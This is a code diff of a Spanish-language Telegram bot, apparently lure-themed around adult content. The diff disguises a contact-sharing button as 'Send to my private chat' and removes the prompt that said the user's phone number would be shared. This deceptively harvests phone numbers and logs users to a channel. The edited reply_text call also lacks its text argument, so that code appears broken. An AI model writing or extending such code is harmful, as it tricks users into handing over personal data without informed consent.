@@ -15,10 +15,10 @@ VIDEO = os.getenv("VIDEO", "").strip() # file_id o URL
 # ==============================
 
 INDEX = {}    # msg_id_en_canal -> chat_id_usuario
-BANNED = set()  # usuarios baneados
+BANNED = set()
 BANNED_FILE = "baneados.txt"
 
-# ---------- Funciones BAN persistente ----------
+# ---------- BAN persistente ----------
 def cargar_baneados():
     if not os.path.exists(BANNED_FILE):
         return
@@ -37,8 +37,10 @@ def guardar_baneados():
 # ---------- Textos ----------
 def saludo(u) -> str:
     return (
-        f"𝐇𝐨𝐥𝐚 {u.full_name} 𝐞𝐬𝐭𝐚𝐬 𝐞𝐧 𝐞𝐥 𝐥𝐮𝐠𝐚𝐫 𝐜𝐨𝐫𝐫𝐞𝐜𝐭𝐨 𝐩𝐚𝐫𝐚 𝐝𝐞𝐬𝐜𝐚𝐫𝐠𝐚𝐫 𝐞𝐥 𝐜𝐨𝐧𝐭𝐞𝐧𝐢𝐝𝐨.\n\n"
-        f"𝐏𝐫𝐞𝐬𝐢𝐨𝐧𝐚 𝐞𝐥 𝐛𝐨𝐭𝐨𝐧 “𝐄𝐧𝐯𝐢𝐚𝐫 𝐚 𝐦𝐢 𝐜𝐡𝐚𝐭 𝐩𝐫𝐢𝐯𝐚𝐝𝐨” 𝐩𝐚𝐫𝐚 𝐞𝐧𝐯𝐢𝐚𝐫𝐭𝐞 𝐞𝐥 𝐞𝐧𝐥𝐚𝐜𝐞 𝐝𝐞𝐥 𝐠𝐫𝐮𝐩𝐨."
+        f"𝐇𝐨𝐥𝐚 {u.full_name} 𝐞𝐬𝐭𝐚𝐬 𝐞𝐧 𝐞𝐥 𝐥𝐮𝐠𝐚𝐫 𝐜𝐨𝐫𝐫𝐞𝐜𝐭𝐨 𝐩𝐚𝐫𝐚 𝐝𝐞𝐬𝐜𝐚𝐫𝐠𝐚𝐫 𝐞𝐥 𝐜𝐨𝐧𝐭𝐞𝐧𝐢𝐝𝐨.\n"
+        f"𝐏𝐫𝐞𝐬𝐢𝐨𝐧𝐚 𝐞𝐥 𝐛𝐨𝐭𝐨𝐧:\n\n"
+        f"“𝐄𝐍𝐕𝐈𝐀𝐑 𝐀 𝐌𝐈 𝐂𝐇𝐀𝐓 𝐏𝐑𝐈𝐕𝐀𝐃𝐎”\n\n"
+        f"𝐩𝐚𝐫𝐚 𝐞𝐧𝐯𝐢𝐚𝐫𝐭𝐞 𝐞𝐥 𝐞𝐧𝐥𝐚𝐜𝐞 𝐝𝐞𝐥 𝐠𝐫𝐮𝐩𝐨."
     )
 
 def post_contacto(u) -> str:
@@ -49,12 +51,12 @@ def post_contacto(u) -> str:
 
 # ---------- Botoneras ----------
 def kb_contacto():
-    btn = KeyboardButton("𝐄𝐧𝐯𝐢𝐚𝐫 𝐚 𝐦𝐢 𝐜𝐡𝐚𝐭 𝐩𝐫𝐢𝐯𝐚𝐝𝐨", request_contact=True)
+    btn = KeyboardButton("𝐄𝐍𝐕𝐈𝐀𝐑 𝐀 𝐌𝐈 𝐂𝐇𝐀𝐓 𝐏𝐑𝐈𝐕𝐀𝐃𝐎", request_contact=True)
     return ReplyKeyboardMarkup([[btn]], resize_keyboard=True, one_time_keyboard=True)
 
 def kb_unirme():
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("𝐔𝐧𝐢𝐫𝐦𝐞 𝐚𝐥 𝐠𝐫𝐮𝐩𝐨", url="https://t.me/CubanitasX_bot")]
+        [InlineKeyboardButton("𝐔𝐧𝐢𝐫𝐦𝐞 𝐚𝐥 𝐠𝐫𝐮𝐩𝐨", url="https://t.me/CubanitasXXX_bot")]
     ])
 
 # ---------- Handlers ----------
@@ -72,7 +74,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await context.bot.send_message(chat_id=chat.id, text=saludo(user))
 
-    await update.message.reply_text("Para continuar, comparte tu número:", reply_markup=kb_contacto())
+    # mostrar directamente el botón de contacto, sin texto adicional
+    await update.message.reply_text(reply_markup=kb_contacto())
 
     header = (
         f"🆕 Usuario inició /start\n"
